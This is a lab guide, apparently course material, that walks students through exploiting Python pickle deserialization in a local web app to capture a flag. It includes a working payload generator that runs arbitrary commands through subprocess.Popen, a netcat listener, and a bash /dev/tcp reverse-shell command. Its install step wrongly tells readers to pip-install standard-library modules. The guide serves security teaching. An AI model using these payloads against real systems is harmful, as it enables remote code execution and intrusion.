# Deserialization Lab 🧪🧬

In this lab we will dive into the world of Deserialization. You will have to exploit a web application that is vulnerable to Deserialization. This website deserializes a cookie for you. To learn what Deserialization is and how to exploit it you will have a couple of objectives.

## Lab Objectives 🎯

1. **Install Burp Suite:**: Install Burp Suite and configure your browser to use it.
2. **Install wireshark:**: Install wireshark and capture the request that is sent to the server.
3. **Capture the request:**: Capture the request that is sent to the server.
4. **Change the payload:**: Change the payload to execute a command on the server.
5. **Confirm you have access:**: Confirm you have access to the server.
6. **Insert a reverse shell:**: Insert a reverse shell into the payload.
7. **Connect to the server:**: Connect to the server using the reverse shell.

## Instructions 📝

### Chapter 1: Installing Burp Suite

Install Burp Suite and configure your browser to use it. [Download Burp Suite](https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install)

### Chapter 2: Installing Wireshark

Install Wireshark. [Download Wireshark](https://www.wireshark.org/download.html)

### Chapter 3: Capturing the request

First Open Burpsuite. Then capture the request that is sent to the server when you click on the `Add Grade` button. [capture the request](https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic)

### Chapter 4: Changing the payload

You see that the request looks something like this:

```
POST /add_grade HTTP/1.1
Host: 127.0.0.1:8989
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

```

Now we need to change the payload to execute a command on the server. Master hacker Rashia Eisi has written you a python script to write a reverse shell into the payload:

```python
import pickle
import subprocess
import base64

class Payload:
    def __reduce__(self):
        user_cmd = input("Enter the command you want to execute: ").strip()
        cmd = user_cmd.split(' ')
        return (subprocess.Popen, (cmd,))

def create_payload():
    serialized_payload = pickle.dumps(Payload())
    encoded_payload = base64.b64encode(serialized_payload).decode()
    print(f"Base64 Encoded Payload: {encoded_payload}")

def test_payload():
    p = input("Enter the base64-encoded payload: ")
    data = base64.b64decode(p)
    print("Attempting to deserialize payload...")
    try:
        pickle.loads(data)
    except Exception as e:
        print(f"Error deserializing payload: {e}")

def main():
    choice = input("Do you want to (create) a payload or (test) a payload? Enter 'create' or 'test': ").strip().lower()
    if choice == 'create':
        create_payload()
    elif choice == 'test':
        test_payload()
    else:
        print("Invalid choice. Please enter 'create' or 'test'.")

if __name__ == "__main__":
    main()
```

The script needs a couple dependencies to work. You can install them with the following command:

```bash
pip install pickle subprocess
```

Copy this into a file and use this script to generate a payload. Find out the current ip of your machine and create a payload with pinging your machine. You can use the script above like this to generate a payload:

```bash
❯ python3 payload.py
Do you want to (create) a payload or (test) a payload? Enter 'create' or 'test': create
Enter the command you want to execute: ping <my ip> -c 5
Base64 Encoded Payload: <output>
```

You can use the test option to test if the payload is working.

You can put the payload into the student field.

### Chapter 5: Confirming you have access

Now we open wireshark and set the selection to pings.

<Question questionNr={1} />

Normally this should be empty before you do anything. Now we forward the request to the server and see if we get a request.

Now we see the origin IP Adress of the server. If you see a request from the server, you have access to the server. Show this in your lab.

### Chapter 6: Inserting a reverse shell

Now we need to start a listener on our machine. You can do this with the following command:

```bash
nc -lvp 2222
```

Now create a payload for the reverse shell. You can use the provided script script to generate a payload which contains this command:

```bash
❯ bash -c 'bash -i >& /dev/tcp/<YOUR-IP>/2222 0>&1'
```

### Chapter 7: Connecting to the server

Now when you execute this command on the server you should get a reverse shell. You can do this by putting the payload into the student field. Then the nc listeners turns into a shell on your machine which is connected to the server.(basically like ssh)

There is a flag file in the /app directory.
